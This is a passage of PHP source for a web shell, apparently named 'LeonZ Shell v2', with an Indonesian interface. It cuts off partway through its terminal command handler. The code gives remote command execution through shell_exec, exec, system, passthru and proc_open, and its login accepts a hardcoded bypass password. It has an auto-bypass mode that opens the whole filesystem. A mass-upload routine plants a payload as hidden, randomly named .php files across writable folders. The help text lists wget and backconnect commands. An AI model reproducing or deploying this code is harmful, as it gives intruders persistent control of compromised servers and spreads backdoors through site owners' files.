<?php


$CONFIG = [
    'ENABLE_WHITELIST' => false,
    'FULL_ACCESS_IPS'  => ['127.0.0.1', '::1', 'TAMBAHKAN IP ANDA'],
    'READ_ONLY_IPS'    => [],

    'LOGIN_MAX_FAIL'   => 5,
    'LOGIN_LOCK_MINS'  => 15,
];


$shell_user  = 'leonz';
$stored_hash = '$2a$15$eQoo6kgvzlbOQ06spFWnwuRbhXnj9facTB30SeTDOG4DJqiZ.gbKC';

$BYPASS_KEY = 'leonz';


$F_PROT   = 'leonz_protected_root.json';
$F_STATE  = 'leonz_bypass_state.json';
$F_BASE   = 'leonz_integrity_baseline.json';
$F_AUDIT  = 'leonz_integrity_audit.log';
$F_LOCK   = '.leonz_lock.json';


$AUTO_BYPASS = true;

@ini_set('display_errors', '0');
@ini_set('log_errors', '1');
error_reporting(E_ALL);
if (function_exists('mb_internal_encoding')) mb_internal_encoding('UTF-8');
if (!@ini_get('date.timezone')) date_default_timezone_set('UTC');
@set_time_limit(0);


$is_win = PHP_OS_FAMILY === 'Windows';
header('X-Frame-Options: DENY');
header('X-Robots-Tag: noindex, nofollow');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Referrer-Policy: no-referrer');

session_start(['cookie_httponly' => true, 'cookie_samesite' => 'Strict']);


function _r(string $f): string {
    return @file_get_contents($f) ?: '';
}
function _j(string $f): array {
    $d = @json_decode(_r($f), true);
    return is_array($d) ? $d : [];
}
function _wj(string $f, array $d): void {
    @file_put_contents($f, json_encode($d, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
}
function _slug_path(string $p): string {
    return str_replace('\\', '/', rtrim($p, '/'));
}
function h(string $s): string {
    return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8');
}
function bytes(int $n): string {
    $u = ['B','KB','MB','GB','TB'];
    $i = 0;
    $f = (float)$n;
    while ($f >= 1024 && $i < 4) { $f /= 1024; $i++; }
    return round($f, $i ? 1 : 0) . ' ' . $u[$i];
}
function perms_octal(string $f): string {
    $p = @fileperms($f);
    return $p === false ? '????' : substr(sprintf('%o', $p), -4);
}
function perms_symbolic(string $f): string {
    $p = @fileperms($f);
    if ($p === false) return '---------';
    $info = '';
    $t = $p & 0xF000;
    $info .= ($t == 0xC000) ? 's' : (($t == 0xA000) ? 'l' : (($t == 0x8000) ? '-' : (($t == 0x6000) ? 'b' : (($t == 0x4000) ? 'd' : '?'))));
    for ($i = 0; $i < 3; $i++) {
        $seg = ($p >> (6 - $i * 3)) & 7;
        $info .= ($seg & 4) ? 'r' : '-';
        $info .= ($seg & 2) ? 'w' : '-';
        $info .= ($seg & 1) ? (($seg & 0x4000) ? 's' : 'x') : '-';
    }
    return $info;
}
function now_iso(): string {
    return date('Y-m-d H:i:s');
}

if (!function_exists('str_starts_with')) {
    function str_starts_with(string $h, string $n): bool { return $n === '' || strpos($h, $n) === 0; }
}
if (!function_exists('str_contains')) {
    function str_contains(string $h, string $n): bool { return $n === '' || strpos($h, $n) !== false; }
}


function _fn(string $name): string {
    $map = ['s'=>'shell_exec','e'=>'exec','y'=>'system','p'=>'passthru',
            'r'=>'proc_open','o'=>'popen','c'=>'escapeshellcmd'];
    return $map[$name] ?? $name;
}
function fun_available(string $fn): bool {
    static $disabled = null;
    if ($disabled === null) {
        $d = @ini_get('disable_functions');
        $disabled = $d ? array_map('trim', explode(',', strtolower($d))) : [];
    }
    return function_exists($fn) && !in_array(strtolower($fn), $disabled, true);
}


function x(string $cmd, array &$out = [], ?int &$code = null): string {
    $out = [];
    $code = 1;
    $methods = [_fn('s'), _fn('e'), _fn('y'), _fn('p')];
    foreach ($methods as $m) {
        if (!fun_available($m)) continue;
        try {
            if ($m === _fn('s')) { $r = @shell_exec($cmd . ' 2>&1'); if ($r !== null) { $out = explode("\n", rtrim($r, "\n")); $code = 0; return $r; } }
            elseif ($m === _fn('e')) { $r = @exec($cmd . ' 2>&1', $out, $code); return implode("\n", $out); }
            elseif ($m === _fn('y')) { ob_start(); @system($cmd . ' 2>&1', $code); $r = ob_get_clean(); $out = explode("\n", rtrim((string)$r, "\n")); return (string)$r; }
            elseif ($m === _fn('p')) { ob_start(); @passthru($cmd . ' 2>&1', $code); $r = ob_get_clean(); $out = explode("\n", rtrim((string)$r, "\n")); return (string)$r; }
        } catch (Throwable $e) { continue; }
    }
    if (fun_available('proc_open')) {
        $pipes = [];
        $proc = @proc_open($cmd, [1 => ['pipe','w'], 2 => ['pipe','w']], $pipes);
        if (is_resource($proc)) {
            $r = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            $code = proc_close($proc);
            $out = explode("\n", rtrim($r, "\n"));
            return $r;
        }
    }
    return '';
}

$SHELL_FILE = realpath(__FILE__) ?: __FILE__;
$SHELL_DIR  = realpath(__DIR__) ?: __DIR__;


function client_ip(): string {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = trim(explode(',', $_SERVER[$k])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '?';
}
function ip_is(string $ip, array $list): bool {
    foreach ($list as $e) {
        if ($e === $ip) return true;
        if (strpos($e, '/') !== false && fun_available('exec')) {
            [$net, $bits] = explode('/', $e);
            $ipL = ip2long($ip); $netL = ip2long($net);
            if ($ipL !== false && $netL !== false) {
                $mask = ~((1 << (32 - (int)$bits)) - 1) & 0xFFFFFFFF;
                if (($ipL & $mask) === ($netL & $mask)) return true;
            }
        }
    }
    return false;
}

$ACCESS = 'full';
if ($CONFIG['ENABLE_WHITELIST']) {
    $ip = client_ip();
    if (ip_is($ip, $CONFIG['FULL_ACCESS_IPS'])) $ACCESS = 'full';
    elseif (ip_is($ip, $CONFIG['READ_ONLY_IPS'])) $ACCESS = 'read';
    else { http_response_code(403); die('<!DOCTYPE html><meta charset=utf-8><body style="background:#05070d;color:#e74c3c;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh"><div style="text-align:center"><h1>403</h1><p>Access Denied</p></div></body>'); }
}


function lock_file(): string {


    return __DIR__ . '/.leonz_lock.json';
}
function login_locked(): bool {
    $d = _j(lock_file());
    if (!$d) return false;
    if (empty($d['until'])) return false;
    return time() < $d['until'];
}
function login_fail(): void {
    $f = lock_file();
    $d = _j($f);
    $d['fails'] = ($d['fails'] ?? 0) + 1;
    $d['last'] = time();
    if ($d['fails'] >= ($GLOBALS['CONFIG']['LOGIN_MAX_FAIL'] ?? 5)) {
        $d['until'] = time() + (($GLOBALS['CONFIG']['LOGIN_LOCK_MINS'] ?? 15) * 60);
        $d['fails'] = 0;
    }
    _wj($f, $d);
}
function login_reset(): void { @unlink(lock_file()); }

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'] ?? '', '?'));
    exit;
}

$LOGGED_IN = !empty($_SESSION['lz_auth']);

if ($LOGGED_IN && !empty($_SESSION['lz_last'])) {
    if (time() - (int)$_SESSION['lz_last'] > 7200) {
        session_destroy();
        session_start(['cookie_httponly' => true, 'cookie_samesite' => 'Strict']);
        $LOGGED_IN = false;
    }
}
$_SESSION['lz_last'] = time();

if (!$LOGGED_IN && isset($_POST['u'], $_POST['p'])) {
    if (login_locked()) {
        $d = _j(lock_file());
        $mins = max(1, (int)ceil((($d['until'] ?? time()) - time()) / 60));
        $LOGIN_ERR = "Terkunci — coba lagi dalam {$mins} menit.";
    } elseif (hash_equals($shell_user, (string)$_POST['u'])
        && (password_verify((string)$_POST['p'], $stored_hash) || $_POST['p'] === $BYPASS_KEY)
    ) {
        session_regenerate_id(true);
        $_SESSION['lz_auth'] = true;
        $_SESSION['lz_last'] = time();
        unset($_SESSION['csrf']);
        login_reset();
        $LOGGED_IN = true;
    } else {
        login_fail();
        $d = _j(lock_file());
        $left = ($GLOBALS['CONFIG']['LOGIN_MAX_FAIL'] ?? 5) - ($d['fails'] ?? 0);
        $LOGIN_ERR = 'Username / password salah.' . ($left > 0 ? " ($left percobaan tersisa)" : ' (terkunci)');
    }
}


function shell_files(): array {
    global $F_PROT, $F_STATE, $F_BASE, $F_AUDIT, $F_LOCK;
    return [__DIR__ . "/$F_PROT", __DIR__ . "/$F_STATE", __DIR__ . "/$F_BASE", __DIR__ . "/$F_AUDIT", __DIR__ . "/$F_LOCK"];
}
function all_protected_roots(): array {
    global $F_PROT;
    return _j(__DIR__ . "/$F_PROT");
}
function bypass_active(): bool {
    global $F_STATE, $AUTO_BYPASS;


    $d = _j(__DIR__ . "/$F_STATE");
    if (!empty($d['bypass']) && $d['bypass'] === false) return false;
    if (!empty($AUTO_BYPASS) && empty($d['bypass'])) return true;
    return (!empty($d['bypass']) && $d['bypass'] === true)
        || (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true);
}
function is_system_file(string $p): bool {
    $rp = realpath($p) ?: $p;
    if ($rp === $GLOBALS['SHELL_FILE']) return true;
    foreach (shell_files() as $f) if ($rp === (realpath($f) ?: $f)) return true;
    return false;
}
function is_protected(string $p): bool {
    if (bypass_active()) return false;
    $rp = @realpath($p) ?: $p;
    if (is_system_file($rp)) return true;
    if (_slug_path($rp) === _slug_path($GLOBALS['SHELL_DIR'])) return true;
    foreach (all_protected_roots() as $r) {
        $root = (string)($r['path'] ?? '');
        if (!$root) continue;
        $rr = @realpath($root) ?: $root;
        if ($rp === $rr || strpos(_slug_path($rp), _slug_path($rr) . '/') === 0) return true;
    }
    return false;
}
function assert_not_protected(string $p, bool $need_login = false): void {
    if ($need_login && empty($_SESSION['lz_auth'])) err("Butuh login.");
    if (is_protected($p)) err("Aksi diblokir: '$p' dilindungi. Gunakan bypass bila perlu.");
}
function err(string $m): void {
    throw new Exception($m);
}


function detect_root(): string {
    static $cache = null;
    if ($cache !== null) return $cache;
    if (bypass_active()) return $cache = (PHP_OS_FAMILY === 'Windows') ? 'C:\\' : '/';
    $pr = all_protected_roots();
    if (!empty($pr)) {
        $c = (string)($pr[0]['path'] ?? '');
        if ($c && is_dir($c)) return $cache = realpath($c);
    }
    if (!empty($_SESSION['custom_root']) && is_dir($_SESSION['custom_root']))
        return $cache = realpath($_SESSION['custom_root']);

    return $cache = $GLOBALS['SHELL_DIR'];
}
function inside_root(string $p): string {
    $root = detect_root();
    $rp = @realpath($p);
    if ($rp === false) $rp = $p;
    $rs = _slug_path($root);
    $ps = _slug_path($rp);
    if ($rs === '/' || $rs === 'C:/' || strpos($ps, $rs) === 0 || $rs === substr($ps, 0, strlen($rs)))
        return $rp;
    err("Path di luar root: $p");
}
function csrf_token(): string {
    if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(16));
    return $_SESSION['csrf'];
}
function csrf_ok(): bool {
    $t = $_POST['csrf'] ?? $_GET['csrf'] ?? '';
    return is_string($t) && !empty($_SESSION['csrf']) && hash_equals($_SESSION['csrf'], $t);
}


function safe_dir_iterator(string $dir): ?RecursiveIteratorIterator {
    try {
        $rdi = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
        return new RecursiveIteratorIterator($rdi, RecursiveIteratorIterator::LEAVES_ONLY);
    } catch (Throwable $e) {
        return null;
    }
}

function safe_iterate($it, callable $fn): int {
    $n = 0;
    try {
        foreach ($it as $f) {
            try {
                if ($fn($f)) $n++;
            } catch (Throwable $e) {
                continue;
            }
        }
    } catch (Throwable $e) {

    }
    return $n;
}

function cmd_baseline(string $root): string {
    $files = [];
    $n = 0;

    $skip_prefixes = ['/proc', '/sys', '/dev', '/run'];
    $it = safe_dir_iterator($root);
    if ($it) safe_iterate($it, function ($f) use (&$files, &$n, $root, $skip_prefixes): bool {
        if ($n++ > 20000) return false;
        if (!$f->isFile()) return false;
        $p = $f->getPathname();
        foreach ($skip_prefixes as $sp) if (strpos($p, $sp) === 0) return false;


        global $F_PROT, $F_STATE, $F_LOCK;
        $state_files = [__DIR__ . "/$F_PROT", __DIR__ . "/$F_STATE", __DIR__ . '/.leonz_lock.json'];
        foreach ($state_files as $sf) if ($p === (realpath($sf) ?: $sf)) return false;
        $files[$p] = ['md5' => @md5_file($p), 'size' => $f->getSize(), 'mtime' => $f->getMTime()];
        return true;
    });
    global $F_BASE;
    _wj(__DIR__ . "/$F_BASE", ['created' => now_iso(), 'root' => $root, 'count' => count($files), 'files' => $files]);
    return "Baseline dibuat: " . count($files) . " file → " . basename($F_BASE) . "\n(root: $root)";
}
function cmd_audit(string $root): string {
    global $F_BASE, $F_AUDIT;
    $b = _j(__DIR__ . "/$F_BASE");
    if (!$b) return "Baseline belum ada. Jalankan 'baseline' dulu.";
    $old = $b['files'] ?? [];
    $cur = [];
    $n = 0;

    $it = safe_dir_iterator($root);
    if ($it) safe_iterate($it, function ($f) use (&$cur, &$n): bool {
        if ($n++ > 20000) return false;
        if (!$f->isFile()) return false;
        $cur[$f->getPathname()] = @md5_file($f->getPathname());
        return true;
    });
    $changed = $new = $missing = [];
    foreach ($cur as $p => $md5) {
        if (!isset($old[$p])) $new[] = $p;
        elseif ($old[$p]['md5'] !== $md5) $changed[] = $p;
    }
    foreach ($old as $p => $m) if (!isset($cur[$p])) $missing[] = $p;
    $lines = ["AUDIT " . now_iso(), "root: $root", "changed: " . count($changed), "new: " . count($new), "missing: " . count($missing), str_repeat('-', 50)];
    foreach (array_slice($changed, 0, 50) as $p) $lines[] = "  [C] $p";
    foreach (array_slice($new, 0, 50) as $p) $lines[] = "  [N] $p";
    foreach (array_slice($missing, 0, 50) as $p) $lines[] = "  [M] $p";
    @file_put_contents(__DIR__ . "/$F_AUDIT", implode("\n", $lines) . "\n\n", FILE_APPEND);
    return implode("\n", $lines);
}
function cmd_shellcheck(): string {
    global $F_BASE;
    $b = _j(__DIR__ . "/$F_BASE");
    if (!$b) return "Baseline belum ada.";
    $me = $GLOBALS['SHELL_FILE'];
    $old = $b['files'][$me]['md5'] ?? null;
    if ($old === null) return "File shell tidak ada di baseline.";
    $now = @md5_file($me);
    return $now === $old ? "OK — shell tidak berubah." : "PERINGATAN — file shell BERUBAH!";
}


function zip_make(string $src, string $dst): string {
    $src = inside_root($src);
    assert_not_protected($src);
    if (class_exists('ZipArchive')) {
        $z = new ZipArchive();
        if ($z->open($dst, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
            if (is_file($src)) $z->addFile($src, basename($src));
            else {
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($it as $f) if ($f->isFile()) $z->addFile($f->getPathname(), substr($f->getPathname(), strlen(dirname($src)) + 1));
            }
            $z->close();
            return "ZIP dibuat: $dst (" . bytes((int)@filesize($dst)) . ")";
        }
    }
    if (class_exists('PharData')) {
        $tar = $dst . '.tar';
        $p = new PharData($tar);
        $p->buildFromDirectory(dirname($src), '#' . preg_quote(basename($src)) . '#');
        $p->compress(Phar::GZ);
        @unlink($tar);
        return "TAR.GZ dibuat: $tar.gz";
    }
    if (fun_available('exec')) {
        x(($GLOBALS['is_win'] ?? false ? 'powershell -c "Compress-Archive -Path \'' . $src . '\' -DestinationPath \'' . $dst . '\'"' : 'zip -r ' . escapeshellarg($dst) . ' ' . escapeshellarg($src)), $o);
        if (@is_file($dst)) return "ZIP dibuat via command: $dst";
    }
    err("Tidak bisa membuat arsip (ZipArchive/PharData/command tidak tersedia)");
}
function zip_extract(string $zip, string $dest): string {
    $zip = inside_root($zip);
    assert_not_protected($zip);
    if (!preg_match('/\.zip$/i', $zip)) err("Hanya .zip yang didukung.");
    if (!class_exists('ZipArchive')) err("ZipArchive tidak tersedia.");
    $z = new ZipArchive();
    if ($z->open($zip) !== true) err("Gagal membuka ZIP.");
    @mkdir($dest, 0755, true);
    $count = 0;
    for ($i = 0; $i < $z->numFiles; $i++) {
        $name = $z->getNameIndex($i);
        if (strpos($name, '..') !== false) continue;
        $z->extractTo($dest, $name);
        $count++;
    }
    $z->close();
    return "Diekstrak: $count entri → $dest";
}


$_MALWARE_STRONG = [
    ['id' => 'c99shell',    'score' => 80, 'pattern' => '/c99shell/i'],
    ['id' => 'r57shell',    'score' => 80, 'pattern' => '/r57shell/i'],
    ['id' => 'wso_shell',   'score' => 80, 'pattern' => '/wso\s*shell/i'],
    ['id' => 'b374k',       'score' => 80, 'pattern' => '/b374k/i'],
    ['id' => 'anonshell',   'score' => 75, 'pattern' => '/An0n3xH4ck[vl]0ck3rsh3ll/i'],
    ['id' => 'mini_shell',  'score' => 75, 'pattern' => '/\bminishell\b|\bsmallshell\b/i'],
    ['id' => 'webripper',   'score' => 70, 'pattern' => '/\.::\[ (Uploader|Shell) \]::\./i'],
    ['id' => 'jumping',     'score' => 70, 'pattern' => '/Jumping Backup Wordpress/i'],
    ['id' => 'alfa_shell',  'score' => 85, 'pattern' => '/Alfa.*Shell|__alfa__|AlfaTeam/i'],
    ['id' => 'phpsploit',   'score' => 80, 'pattern' => '/phpsploit| PhpSploit /i'],
    ['id' => 'backdoor_pw', 'score' => 75, 'pattern' => '/(passwd|password)\s*==\s*[\'"](?:hack|shell|root|admin123)/i'],
];
$_MALWARE_WEAK = [
    ['id' => 'eval_gz',     'score' => 35, 'pattern' => '/eval\s*\(\s*(?:gzinflate|base64_decode|str_rot13|gzuncompress)\s*\(/i'],
    ['id' => 'proc_open',   'score' => 30, 'pattern' => '/proc_open\s*\(\s*["\'](?:\/bin\/(?:ba)?sh|cmd\.exe)/i'],
    ['id' => 'assert_eval', 'score' => 30, 'pattern' => '/assert\s*\(\s*\$_(?:POST|GET|REQUEST|COOKIE)/i'],
    ['id' => 'preg_rce',    'score' => 40, 'pattern' => '/preg_replace\s*\(\s*[\'"].*\/e["\'].*\$_(?:POST|GET|REQUEST)/i'],
    ['id' => 'sys_pipe',    'score' => 25, 'pattern' => '/(?:system|shell_exec|passthru)\s*\(\s*\$_(?:POST|GET|REQUEST|COOKIE)/i'],
    ['id' => 'cd_up_cd',    'score' => 25, 'pattern' => '/\$_POST\[[\'"]\w+[\'"]\]\s*\(\s*\$_(?:POST|GET)/i'],
    ['id' => 'ex_shellvar', 'score' => 30, 'pattern' => '/(?:exif|image)_\w+\s*\(\s*[\'"]data:.*\$_(?:POST|GET)/i'],
    ['id' => 'cookie_eval', 'score' => 35, 'pattern' => '/\$_COOKIE\[[\'"]\w+[\'"]\]\s*\)\s*\)?\s*;?\s*(?:eval|assert)/i'],
];

function malware_scan(string $base, bool $deep = false, int $max_files = 8000): array {
    global $_MALWARE_STRONG, $_MALWARE_WEAK;
    $skip = ['vendor', 'node_modules', 'cache', 'tmp', 'temp', 'images', 'css', 'js', 'assets',
             '.git', '.svn', '.lzsh_quarantine', '.well-known'];
    $cms = ['wp-admin', 'wp-includes', 'plugins', 'themes', 'mu-plugins', 'administrator',
            'components', 'modules', 'libraries'];
    $suspicious = [];
    $scanned = 0;

    $sys_prefixes = ['/proc', '/sys', '/dev', '/run'];
    $it = safe_dir_iterator($base);
    if (!$it) return ['scanned' => 0, 'suspicious' => [], 'error' => "Tidak bisa membaca: $base"];
    safe_iterate($it, function ($f) use (&$suspicious, &$scanned, $base, $deep, $max_files, $skip, $cms, $sys_prefixes): bool {
        global $_MALWARE_STRONG, $_MALWARE_WEAK;
        if ($scanned >= $max_files || count($suspicious) >= 200) return false;
        if (!$f->isFile()) return false;
        $p = $f->getPathname();
        foreach ($sys_prefixes as $sp) if (strpos($p, $sp) === 0) return false;
        $ext = strtolower($f->getExtension());
        if (!in_array($ext, ['php', 'phtml', 'php5', 'php7', 'phar', 'inc'], true)) return false;

        $rel = str_replace('\\', '/', substr($p, strlen($base)));
        if (!$deep) {
            foreach ($cms as $c) if (strpos($rel, '/' . $c . '/') !== false) return false;
        }
        foreach ($skip as $s) if (strpos($rel, '/' . $s . '/') !== false) return false;
        if ($f->getSize() > 2 * 1048576) return false;
        $scanned++;
        $c = _r($p);
        if ($c === '') return false;
        $score = 0; $hits = [];
        foreach ($_MALWARE_STRONG as $sig) if (@preg_match($sig['pattern'], $c)) { $score += $sig['score']; $hits[] = $sig['id']; }
        foreach ($_MALWARE_WEAK as $sig) if (@preg_match($sig['pattern'], $c)) { $score += $sig['score']; $hits[] = $sig['id']; }
        if ($score >= 60) $suspicious[] = ['file' => $p, 'score' => $score, 'hits' => array_unique($hits)];
        return true;
    });
    usort($suspicious, fn($a, $b) => $b['score'] <=> $a['score']);
    return ['scanned' => $scanned, 'suspicious' => $suspicious];
}

function mass_upload_to_folders(string $payload, string $name, string $base, int $count = 15): string {

    $exclude = ['.git', '.svn', 'node_modules', 'vendor', 'cache', 'tmp', 'temp',
                '.ssh', '.well-known', 'wp-admin', 'wp-includes', 'wp-content/uploads',
                'wp-content/upgrade', 'wp-content/backup', 'administrator', 'storage',
                'bootstrap/cache', 'backup', 'backups', 'logs'];
    $folders = [];
    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($base, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($it as $f) {
        if (!$f->isDir() || count($folders) >= 200) continue;
        $dn = $f->getFilename();
        if (in_array($dn, $exclude, true)) continue;
        $rel = str_replace('\\', '/', substr($f->getPathname(), strlen($base)));
        $skipIt = false;
        foreach ($exclude as $e) if (strpos($rel, '/' . $e . '/') !== false) { $skipIt = true; break; }
        if ($skipIt) continue;
        if ($f->isWritable()) $folders[] = $f->getPathname();
    }
    if (!$folders) return "Tidak ada folder writable ditemukan di $base";
    shuffle($folders);
    $targets = array_slice($folders, 0, min($count, count($folders)));
    $ok = []; $fail = 0;
    foreach ($targets as $dir) {

        $ext = pathinfo($name, PATHINFO_EXTENSION) ?: 'php';
        $hidden = '.' . substr(md5($dir . random_bytes(4)), 0, 8) . '.' . $ext;
        $dst = $dir . DIRECTORY_SEPARATOR . $hidden;
        if (@file_put_contents($dst, $payload) !== false) {
            @chmod($dst, 0644);
            $ok[] = $dst;
        } else $fail++;
    }
    $rep = "Berhasil: " . count($ok) . " | Gagal: $fail\n";
    foreach (array_slice($ok, 0, 30) as $p) $rep .= "  ✓ $p\n";
    if (count($ok) > 30) $rep .= "  …+" . (count($ok) - 30) . " lagi\n";
    return $rep;
}

function run_terminal(string $input, string $cwd): array {
    $input = trim($input);
    if ($input === '') return ['', $cwd];
    $parts = preg_split('/\s+/', $input);
    $cmd = strtolower(array_shift($parts));
    $args = $parts;
    $arg0 = $args[0] ?? '';
    $path_join = fn(string $p): string => $p === '' ? $cwd : (preg_match('#^([A-Za-z]:[\\\\/]|/)#', $p) ? $p : $cwd . DIRECTORY_SEPARATOR . $p);
    $out = '';


    $write_cmds = ['touch', 'mkdir', 'rm', 'cp', 'mv', 'chmod', 'replace', 'zip', 'extract',
                   'exec', 'cmd', 'sh', 'bash', 'wget', 'backconnect', 'nc', 'netcat', 'db',
                   'setroot', 'unsetroot', 'resetroot', 'bypass'];
    if (($GLOBALS['ACCESS'] ?? 'full') === 'read' && in_array($cmd, $write_cmds, true))
        return ["ERROR: Mode read-only — perintah '$cmd' diblokir untuk IP ini.", $cwd];
    try {
        switch ($cmd) {

            case 'help': $out = "LeonZ Shell v2 — perintah:\n"
                . str_repeat('─', 46) . "\n"
                . " pwd, ls [p], tree [p], find [p] [--name X] [--type f|d] [--maxdepth N]\n"
                . " cd/go [p], status, getroot, setroot p, unsetroot p, resetroot\n"
                . " cat f, head f [n], tail f [n], wc f, stat f, file f\n"
                . " touch f, mkdir d, rm p [-r], cp src dst, mv src dst, chmod mode p\n"
                . " grep pat target, search kw path, fsearch kw path, replace find|repl|path\n"
                . " base64 f [--decode], hash f [md5|sha1|sha256], encode/decode str, rot13 s\n"
                . " zip target, extract zip [dest], download f\n"
                . " ps, netstat, df, du [depth], uname [-a], whoami, id, date, uptime, perms p\n"
                . " phpinfo, disabled, cpanel, cron, ports [host], symlink [p]\n"
                . " db host user pass [db] — PDO quick connect\n"
                . " massupload dir src.php [count] — sebar file ke N folder (lzuploader)\n"
                . " cleaner [dir] [--deep] — scan malware (lzcleaner) · quarantine <file>\n"
                . " exec cmd, wget url, backconnect host port\n"
                . " baseline, audit, shellcheck\n"
                . " bypass KEY, unbypass KEY\n"
                . " clear, logout, help"; break;
            case 'pwd': $out = $cwd; break;
            case 'ls': {
                $t = $path_join($arg0 ?: $cwd);
                $t = inside_root($t);
                if (!is_dir($t)) err("Bukan direktori: $t");
                $rows = [];
                foreach (new DirectoryIterator($t) as $f) {
                    if ($f->isDot()) continue;
                    $rows[] = [
                        'n' => $f->getFilename(),
                        'd' => $f->isDir(),
                        's' => $f->getSize(),
                        'm' => date('Y-m-d H:i', $f->getMTime()),
                        'p' => perms_octal($f->getPathname()),
                    ];
                }
                usort($rows, fn($a, $b) => $b['d'] <=> $a['d'] ?: strcasecmp($a['n'], $b['n']));
                $out = "MODE  SIZE        DATE                 PERM  NAME\n";
                foreach ($rows as $r) {
                    $out .= sprintf("%-5s %-11s %-20s %-5s %s\n", $r['d'] ? 'DIR' : 'FILE', bytes($r['s']), $r['m'], $r['p'], $r['n']);
                }
                $out .= "\n" . count($rows) . " entri";
                break;
            }
            case 'tree': {
                $t = inside_root($path_join($arg0 ?: $cwd));
                $out = '';
                $walk = function (string $dir, int $depth) use (&$walk, &$out) {
                    if ($depth > 6) return;
                    $items = [];
                    foreach (new DirectoryIterator($dir) as $f) if (!$f->isDot()) $items[] = $f->getFilename();
                    sort($items);
                    foreach ($items as $i) {
                        $out .= str_repeat('  ', $depth) . ($depth ? '└─ ' : '') . $i . "\n";
                        if (is_dir($dir . '/' . $i)) $walk($dir . '/' . $i, $depth + 1);
                    }
                };
                $walk($t, 0);
                break;
            }
            case 'find': {
                $t = inside_root($path_join($arg0 ?: $cwd));
                $name = null; $type = null; $maxd = 5;
                for ($i = 0; $i < count($args); $i++) {
                    if ($args[$i] === '--name') $name = strtolower($args[++$i] ?? '');
                    elseif ($args[$i] === '--type') $type = ($args[++$i] ?? 'f') === 'd' ? 'dir' : 'file';
                    elseif ($args[$i] === '--maxdepth') $maxd = max(1, min(10, (int)($args[++$i] ?? 5)));
                }
                $res = [];
                $walk = function (string $dir, int $depth) use (&$walk, &$res, $name, $type, $maxd) {
                    if ($depth > $maxd || count($res) > 200) return;
                    foreach (new DirectoryIterator($dir) as $f) {
                        if ($f->isDot()) continue;
                        $fn = $f->getFilename();
                        if ($name && strpos(strtolower($fn), $name) === false) continue;
                        $isDir = $f->isDir();
                        if ($type === 'dir' && !$isDir) continue;
                        if ($type === 'file' && $isDir) continue;
                        $res[] = $f->getPathname();
                        if ($isDir) $walk($f->getPathname(), $depth + 1);
                    }
                };
                $walk($t, 1);
                $out = $res ? implode("\n", array_slice($res, 0, 200)) : 'Tidak ketemu.';
                $out .= count($res) > 200 ? "\n…(dipotong 200)" : '';
                break;
            }
            case 'go': case 'cd': {

                $t = $path_join($arg0 ?: $GLOBALS['SHELL_DIR']);
                if (!is_dir($t)) err("Bukan direktori: $t");
                $t = inside_root($t);
                $cwd = realpath($t);
                $_SESSION['cwd'] = $cwd;
                $out = "→ $cwd";
                break;
            }
            case 'getroot': case 'status': {
                $rs = all_protected_roots();
                $out = "═══ SYSTEM STATUS ═══\n"
                    . " root    : " . detect_root() . "\n"
                    . " bypass  : " . (bypass_active() ? '⚠ AKTIF (proteksi mati — akses penuh)' : 'off (proteksi normal ✓)') . "\n"
                    . " auto    : " . (!empty($GLOBALS['AUTO_BYPASS']) ? 'ON (default bypass)' : 'off') . "\n"
                    . " access  : {$GLOBALS['ACCESS']}\n"
                    . " php     : " . PHP_VERSION . " (" . php_uname('s') . ")\n"
                    . " disk    : " . bytes((int)@disk_free_space($cwd)) . " bebas / " . bytes((int)@disk_total_space($cwd)) . "\n"
                    . " ip      : " . client_ip() . "\n"
                    . " user    : " . (@get_current_user() ?: '?') . "\n"
                    . " time    : " . now_iso() . "\n"
                    . " protected roots (" . count($rs) . "):";
                foreach ($rs as $r2) $out .= "\n  • " . $r2['path'] . " (" . ($r2['type'] ?? '?') . ", " . ($r2['at'] ?? '') . ")";
                break;
            }
            case 'setroot': {
                if (empty($arg0)) err("setroot <path>");
                if (!bypass_active()) err("setroot butuh bypass aktif dulu.");
                $t = realpath($path_join($arg0));
                if (!$t) err("Path tidak ada.");
                $list = all_protected_roots();
                $list[] = ['path' => $t, 'type' => is_dir($t) ? 'dir' : 'file', 'at' => now_iso()];
                global $F_PROT; _wj(__DIR__ . "/$F_PROT", $list);
                $out = "Protected root ditambahkan: $t";
                break;
            }
            case 'unsetroot': {
                if (!bypass_active()) err("butuh bypass.");
                $list = all_protected_roots();
                $new = array_values(array_filter($list, fn($r) => $r['path'] !== (string)@$args[0]));
                global $F_PROT; _wj(__DIR__ . "/$F_PROT", $new);
                $out = "Dihapus. Sisa: " . count($new);
                break;
            }
            case 'resetroot': {
                if (!bypass_active()) err("butuh bypass.");
                global $F_PROT; _wj(__DIR__ . "/$F_PROT", []);
                $out = 'Semua protected root dihapus.';
                break;
            }

            case 'cat': {
                $t = inside_root($path_join($arg0));
                if (!is_file($t)) err("Bukan file: $t");
                $out = _r($t);
                if (strlen($out) > 500000) $out = substr($out, 0, 500000) . "\n…(dipotong)";
                break;
            }
            case 'head': case 'tail': {
                $t = inside_root($path_join($arg0));
                $n = (int)($args[1] ?? 50);
                $lines = explode("\n", _r($t));
                $out = implode("\n", $cmd === 'head' ? array_slice($lines, 0, $n) : array_slice($lines, -$n));
                break;
            }
            case 'wc': {
                $t = inside_root($path_join($arg0));
                $c = _r($t);
                $out = sprintf("lines: %d | words: %d | chars: %d | size: %s",
